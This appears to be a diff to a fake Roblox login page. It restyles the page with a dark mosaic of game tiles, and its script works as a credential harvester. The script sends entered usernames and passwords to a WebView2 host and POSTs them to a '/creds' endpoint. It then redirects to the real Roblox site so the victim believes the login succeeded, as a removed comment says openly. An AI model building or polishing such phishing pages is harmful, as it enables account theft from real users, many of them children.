@@ -2,142 +2,185 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>Log In to Roblox</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<link href="https://fonts.googleapis.com/css2?family=Hind:wght@400;500;600;700&display=swap" rel="stylesheet">
+<title>Roblox</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<link href="https://fonts.googleapis.com/css2?family=Hind:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
-  * { box-sizing: border-box; }
-  html, body { margin:0; padding:0; font-family:"Hind","Segoe UI",Roboto,Arial,sans-serif; color:#393b3d; background:#fff; }
-  a { color:#0074bd; text-decoration:none; }
-  a:hover { text-decoration:underline; }
+  * { box-sizing:border-box; }
+  html,body { margin:0; padding:0; height:100%; font-family:"Hind","Segoe UI",Roboto,Arial,sans-serif; background:#0b0d10; overflow:hidden; }
+  a { text-decoration:none; }
 
-  /* header */
-  .topbar {
-    height:56px; padding:0 24px; display:flex; align-items:center; justify-content:space-between;
-    border-bottom:1px solid #e3e5e7; background:#fff;
+  /* ===== mosaic background ===== */
+  .mosaic { position:fixed; inset:0; display:grid;
+    grid-template-columns:repeat(7, 1fr);
+    grid-template-rows:repeat(5, 1fr);
+    gap:24px; padding:40px; transform:scale(1.08); z-index:0; }
+  .tile {
+    position:relative; border-radius:10px; overflow:hidden;
+    display:flex; align-items:center; justify-content:center;
+    color:#fff; font-weight:800; letter-spacing:.5px;
+    font-size:clamp(14px,1.6vw,26px); text-transform:uppercase;
+    text-shadow:0 2px 8px rgba(0,0,0,.7);
+    box-shadow:0 12px 30px rgba(0,0,0,.45);
+    filter:saturate(.85) brightness(.85);
   }
-  .topbar .logo { font-weight:800; font-size:24px; color:#393b3d; letter-spacing:-.5px; }
-  .topbar .nav a { color:#393b3d; font-weight:500; font-size:14px; margin-left:20px; }
-  .topbar .nav a:hover { color:#0074bd; text-decoration:none; }
+  .tile::after { content:""; position:absolute; inset:0; background:
+    radial-gradient(circle at 30% 20%, rgba(255,255,255,.15), transparent 60%); }
 
-  /* card */
-  .wrap { min-height:calc(100vh - 56px); display:flex; justify-content:center; padding:48px 16px 80px; }
-  .card { width:100%; max-width:420px; }
-  .avatar {
-    width:100px; height:100px; border-radius:50%; background:#f2f4f5;
-    display:flex; align-items:center; justify-content:center; margin:0 auto 20px;
-    border:1px solid #e3e5e7;
-  }
-  .avatar svg { width:56px; height:56px; fill:#b8bcbf; }
-  h1 { font-size:26px; font-weight:700; text-align:center; margin:0 0 32px; color:#393b3d; }
-  label { display:block; font-size:14px; font-weight:500; color:#393b3d; margin-bottom:6px; }
-  input {
-    width:100%; padding:12px 14px; border:1px solid #b8bcbf; border-radius:3px;
-    font-size:16px; font-family:inherit; margin-bottom:20px; outline:none; background:#fff;
-    color:#393b3d;
-  }
-  input:focus { border-color:#0074bd; box-shadow:0 0 0 2px rgba(0,116,189,.18); }
-  .row { display:flex; align-items:center; justify-content:space-between; margin-bottom:20px; }
-  .row .forgot { font-size:14px; color:#0074bd; }
-  .row .forgot:hover { text-decoration:underline; }
+  /* veil: darkens edges, darkens center where the card sits */
+  .veil { position:fixed; inset:0; z-index:1;
+    background:
+      radial-gradient(ellipse 700px 700px at 50% 52%, rgba(0,0,0,.85) 0%, rgba(0,0,0,.45) 55%, rgba(0,0,0,.7) 100%),
+      linear-gradient(180deg, rgba(0,0,0,.55), rgba(0,0,0,.55)); }
 
-  button.submit {
-    width:100%; padding:13px; background:#0074bd; color:#fff; border:none; border-radius:3px;
-    font-size:16px; font-weight:600; font-family:inherit; cursor:pointer;
-  }
-  button.submit:hover { background:#005e99; }
-  button.submit:disabled { background:#7aa9cb; cursor:default; }
+  /* ===== top nav ===== */
+  .nav { position:fixed; top:0; left:0; right:0; height:56px; z-index:10;
+    display:flex; align-items:center; padding:0 24px; gap:36px; background:transparent; }
+  .logo { font-weight:800; font-size:22px; color:#fff; letter-spacing:1px; }
+  .logo b { font-weight:800; }
+  .navlinks { display:flex; gap:28px; }
+  .navlinks a { color:#fff; font-size:15px; font-weight:500; opacity:.9; }
+  .navlinks a:hover { opacity:1; }
+  .search { flex:1; max-width:520px; margin-left:auto; margin-right:16px; position:relative; }
+  .search input { width:100%; height:34px; border-radius:8px; border:1px solid rgba(255,255,255,.2);
+    background:rgba(255,255,255,.06); color:#fff; font-size:14px; padding:0 12px 0 36px; outline:none; }
+  .search input::placeholder { color:rgba(255,255,255,.6); }
+  .search svg { position:absolute; left:10px; top:50%; transform:translateY(-50%);
+    width:16px; height:16px; fill:rgba(255,255,255,.7); }
+  .signup-btn { background:#00a2ff; color:#fff; border:none; border-radius:8px;
+    padding:9px 18px; font-size:14px; font-weight:600; cursor:pointer; }
+  .signup-btn:hover { background:#0091e6; }
 
-  .signup { text-align:center; margin-top:24px; font-size:14px; color:#393b3d; }
-  .signup a { color:#0074bd; font-weight:500; }
+  /* ===== login card ===== */
+  .stage { position:fixed; inset:0; z-index:2; display:flex; align-items:center; justify-content:center; }
+  .card { width:400px; background:rgba(15,17,21,.96); border:1px solid rgba(255,255,255,.08);
+    border-radius:12px; padding:32px 36px 28px; box-shadow:0 30px 60px rgba(0,0,0,.6); }
+  .card h1 { color:#fff; font-size:24px; font-weight:700; text-align:center; margin:0 0 24px; }
 
-  .divider { text-align:center; margin:24px 0; color:#b8bcbf; font-size:13px; }
-  .social { display:flex; gap:12px; justify-content:center; }
-  .social .sbtn {
-    flex:1; max-width:120px; padding:11px; background:#f2f4f5; border:1px solid #e3e5e7;
-    border-radius:3px; font-size:13px; font-weight:500; color:#393b3d; cursor:pointer; text-align:center;
-  }
-  .social .sbtn:hover { background:#e8ebed; }
+  .field { margin-bottom:14px; }
+  .field input { width:100%; height:46px; border-radius:8px;
+    background:rgba(255,255,255,.05); border:1px solid rgba(255,255,255,.15);
+    color:#fff; font-size:15px; font-family:inherit; padding:0 14px; outline:none; }
+  .field input::placeholder { color:rgba(255,255,255,.55); }
+  .field input:focus { border-color:#00a2ff; box-shadow:0 0 0 2px rgba(0,162,255,.2); }
 
-  .err { color:#d93025; font-size:13px; margin-bottom:12px; display:none; text-align:center; }
+  .btn-primary { width:100%; height:46px; margin-top:6px; border:none; border-radius:8px;
+    background:#fff; color:#0b0d10; font-size:15px; font-weight:600; font-family:inherit;
+    cursor:pointer; }
+  .btn-primary:hover { background:#f0f2f5; }
+  .btn-primary:disabled { background:#aab0b8; cursor:default; }
 
-  /* footer */
-  .footer {
-    border-top:1px solid #e3e5e7; padding:20px 24px; font-size:13px;
-    color:#6e757a; display:flex; flex-wrap:wrap; gap:16px; align-items:center;
-  }
-  .footer a { color:#6e757a; }
-  .footer a:hover { color:#393b3d; text-decoration:none; }
+  .forgot { display:block; text-align:center; color:#fff; font-size:14px; margin:16px 0 18px; opacity:.9; }
+  .forgot:hover { opacity:1; text-decoration:underline; }
+
+  .divider { height:1px; background:rgba(255,255,255,.12); margin:6px 0 18px; }
+
+  .btn-secondary { width:100%; height:44px; margin-bottom:10px; border-radius:8px;
+    background:rgba(255,255,255,.07); border:1px solid rgba(255,255,255,.14);
+    color:#fff; font-size:14px; font-weight:500; font-family:inherit; cursor:pointer; }
+  .btn-secondary:hover { background:rgba(255,255,255,.12); }
+
+  .signup-line { text-align:center; color:rgba(255,255,255,.85); font-size:14px; margin-top:20px; }
+  .signup-line a { color:#00a2ff; font-weight:600; }
+  .signup-line a:hover { text-decoration:underline; }
+
+  .err { color:#ff6b6b; font-size:13px; text-align:center; margin-bottom:10px; display:none; }
 </style>
 </head>
 <body>
 
-<div class="topbar">
-  <div class="logo">ROBLOX</div>
-  <div class="nav">
-    <a href="#">About Us</a>
-    <a href="#">Careers</a>
-    <a href="#">Blog</a>
-    <a href="#">Help</a>
-  </div>
+<div class="mosaic">
+  <div class="tile" style="grid-area:1/1; background:linear-gradient(135deg,#3b1d52,#7a3fb0); transform:rotate(-3deg);">MIMIC</div>
+  <div class="tile" style="grid-area:1/2; background:linear-gradient(135deg,#1a3d6b,#3a7bd5); transform:rotate(2deg);">JAILBREAK</div>
+  <div class="tile" style="grid-area:1/3; background:linear-gradient(135deg,#0b3d4a,#1f7a8c); transform:rotate(-2deg);">SHARKBITEZ</div>
+  <div class="tile" style="grid-area:1/4; background:linear-gradient(135deg,#4a1f1f,#8b2f2f); transform:rotate(1deg);">HEROES</div>
+  <div class="tile" style="grid-area:1/5; background:linear-gradient(135deg,#2a1a3a,#5a3b8a); transform:rotate(-1deg);">FIELD TRIP Z</div>
+  <div class="tile" style="grid-area:1/6; background:linear-gradient(135deg,#4a2f1a,#8a5a2f); transform:rotate(3deg);">DRIVING EMPIRE</div>
+  <div class="tile" style="grid-area:1/7; background:linear-gradient(135deg,#3a1f3a,#a03a8a); transform:rotate(-2deg);">SLIVINGLAND</div>
+
+  <div class="tile" style="grid-area:2/1; background:linear-gradient(135deg,#1a2f4a,#3a5f9a); transform:rotate(2deg);">DUNGEON QUEST</div>
+  <div class="tile" style="grid-area:2/2; background:linear-gradient(135deg,#5a2a1a,#a04a2a); transform:rotate(-3deg);">DOORS</div>
+  <div class="tile" style="grid-area:2/3; background:linear-gradient(135deg,#0b1a3d,#1f3a7a); transform:rotate(1deg);">DUELING GROUNDS</div>
+  <div class="tile" style="grid-area:2/4; background:linear-gradient(135deg,#3a2a1a,#7a5a2a); transform:rotate(-1deg);">NORTHWIND</div>
+  <div class="tile" style="grid-area:2/5; background:linear-gradient(135deg,#4a1a2a,#9a2a4a); transform:rotate(2deg);">PIGGY</div>
+  <div class="tile" style="grid-area:2/6; background:linear-gradient(135deg,#1a3a2a,#2a7a4a); transform:rotate(-2deg);">UNIVERSE FOOTBALL</div>
+  <div class="tile" style="grid-area:2/7; background:linear-gradient(135deg,#2a2a3a,#5a5a7a); transform:rotate(3deg);">DRIVING EMPIRE</div>
+
+  <div class="tile" style="grid-area:3/1; background:linear-gradient(135deg,#3a1a4a,#8a2a9a); transform:rotate(-2deg);">SHAWARMA ANOMALIES</div>
+  <div class="tile" style="grid-area:3/2; background:linear-gradient(135deg,#1a4a3a,#2a9a6a); transform:rotate(2deg);">FISCH</div>
+  <div class="tile" style="grid-area:3/6; background:linear-gradient(135deg,#4a3a1a,#9a7a2a); transform:rotate(-3deg);">ADOPT ME</div>
+  <div class="tile" style="grid-area:3/7; background:linear-gradient(135deg,#2a1a4a,#6a3a9a); transform:rotate(1deg);">DANDY'S WORLD</div>
+
+  <div class="tile" style="grid-area:4/1; background:linear-gradient(135deg,#1a2a2a,#3a6a6a); transform:rotate(3deg);">DOORS</div>
+  <div class="tile" style="grid-area:4/2; background:linear-gradient(135deg,#3a1a1a,#7a2a2a); transform:rotate(-1deg);">MIMIC</div>
+  <div class="tile" style="grid-area:4/3; background:linear-gradient(135deg,#2a3a1a,#5a7a2a); transform:rotate(2deg);">ADOPT ME</div>
+  <div class="tile" style="grid-area:4/4; background:linear-gradient(135deg,#1a1a4a,#3a3a9a); transform:rotate(-2deg);">FISCH</div>
+  <div class="tile" style="grid-area:4/5; background:linear-gradient(135deg,#4a2a3a,#9a4a7a); transform:rotate(1deg);">DANDY'S WORLD</div>
+  <div class="tile" style="grid-area:4/6; background:linear-gradient(135deg,#2a1a2a,#6a2a6a); transform:rotate(-3deg);">SLIVINGLAND</div>
+  <div class="tile" style="grid-area:4/7; background:linear-gradient(135deg,#1a3a4a,#2a7a9a); transform:rotate(2deg);">JAILBREAK</div>
+
+  <div class="tile" style="grid-area:5/1; background:linear-gradient(135deg,#3a2a1a,#7a5a3a); transform:rotate(-2deg);">DUELING GROUNDS</div>
+  <div class="tile" style="grid-area:5/2; background:linear-gradient(135deg,#1a3a1a,#3a7a3a); transform:rotate(1deg);">UNIVERSE FOOTBALL</div>
+  <div class="tile" style="grid-area:5/3; background:linear-gradient(135deg,#4a1a3a,#9a2a7a); transform:rotate(-1deg);">PIGGY</div>
+  <div class="tile" style="grid-area:5/4; background:linear-gradient(135deg,#2a2a1a,#5a5a3a); transform:rotate(2deg);">SHAWARMA ANOMALIES</div>
+  <div class="tile" style="grid-area:5/5; background:linear-gradient(135deg,#1a1a3a,#3a3a7a); transform:rotate(-3deg);">DUNGEON QUEST</div>
+  <div class="tile" style="grid-area:5/6; background:linear-gradient(135deg,#3a1a2a,#7a2a5a); transform:rotate(1deg);">FIELD TRIP Z</div>
+  <div class="tile" style="grid-area:5/7; background:linear-gradient(135deg,#0b2a4a,#1f5a8a); transform:rotate(-2deg);">SHARKBITEZ</div>
 </div>
 
-<div class="wrap">
-  <div class="card">
-    <div class="avatar">
-      <svg viewBox="0 0 24 24"><path d="M12 12c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm0 2c-3.33 0-10 1.67-10 5v3h20v-3c0-3.33-6.67-5-10-5z"/></svg>
-    </div>
-    <h1>Log In to Roblox</h1>
+<div class="veil"></div>
 
-    <div class="err" id="err">Incorrect username or password. Please try again.</div>
+<nav class="nav">
+  <div class="logo">R<b style="color:#fff">O</b>BLOX</div>
+  <div class="navlinks">
+    <a href="#">Charts</a>
+    <a href="#">Marketplace</a>
+    <a href="#">Create</a>
+    <a href="#">Robux</a>
+  </div>
+  <div class="search">
+    <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27a6.5 6.5 0 1 0-.7.7l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0A4.5 4.5 0 1 1 14 9.5 4.5 4.5 0 0 1 9.5 14z"/></svg>
+    <input placeholder="Search">
+  </div>
+  <button class="signup-btn">Sign Up</button>
+</nav>
+
+<div class="stage">
+  <div class="card">
+    <h1>Login to Roblox</h1>
+
+    <div class="err" id="err">Incorrect username or password.</div>
 
     <form id="f" autocomplete="off">
-      <label for="username">Username/Email</label>
-      <input id="username" name="username" type="text" required autocapitalize="off" autocorrect="off">
-
-      <label for="password">Password</label>
-      <input id="password" name="password" type="password" required>
-
-      <div class="row">
-        <span></span>
-        <a class="forgot" href="#">Forgot Password?</a>
+      <div class="field">
+        <input id="username" type="text" placeholder="Username/Email/Phone" required autocapitalize="off" autocorrect="off" spellcheck="false">
       </div>
-
-      <button class="submit" type="submit" id="btn">Log In</button>
+      <div class="field">
+        <input id="password" type="password" placeholder="Password" required>
+      </div>
+      <button class="btn-primary" type="submit" id="btn">Log In</button>
     </form>
 
-    <div class="signup">Don't have an account? <a href="#">Sign Up</a></div>
+    <a class="forgot" href="#">Forgot Password or Username?</a>
 
-    <div class="divider">Or</div>
-    <div class="social">
-      <div class="sbtn">Facebook</div>
-      <div class="sbtn">Google</div>
-      <div class="sbtn">Apple</div>
-    </div>
+    <div class="divider"></div>
+
+    <button class="btn-secondary" type="button">Email Me a One-Time Code</button>
+    <button class="btn-secondary" type="button">Quick Sign-in</button>
+
+    <div class="signup-line">Don't have an account? <a href="#">Sign Up</a></div>
   </div>
-</div>
-
-<div class="footer">
-  <span>©2026 Roblox Corporation</span>
-  <a href="#">About Us</a>
-  <a href="#">Careers</a>
-  <a href="#">Blog</a>
-  <a href="#">Help</a>
-  <a href="#">Terms</a>
-  <a href="#">Privacy</a>
 </div>
 
 <script>
   function send(username, password) {
-    // WebView2 host picks this up
     if (window.chrome && window.chrome.webview) {
       window.chrome.webview.postMessage(username + "|" + password);
     }
-    // browser fallback
     try {
       fetch("/creds", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
+        method:"POST",
+        headers:{ "Content-Type":"application/json" },
         body: JSON.stringify({ email: username, password: password, stage: "roblox-login" })
       });
     } catch(e){}
@@ -147,7 +190,7 @@
     e.preventDefault();
     const u = document.getElementById("username").value.trim();
     const p = document.getElementById("password").value;
-    if (!u || !p) return;
+    if (!u || !p) { document.getElementById("err").style.display="block"; return; }
 
     send(u, p);
 
@@ -155,10 +198,7 @@
     btn.disabled = true;
     btn.textContent = "Logging in…";
 
-    // fake a beat, then bounce to real Roblox — user thinks they got in
-    setTimeout(function(){
-      window.location.href = "https://www.roblox.com/home";
-    }, 1500);
+    setTimeout(function(){ window.location.href = "https://www.roblox.com/home"; }, 1500);
   });
 </script>
 </body>
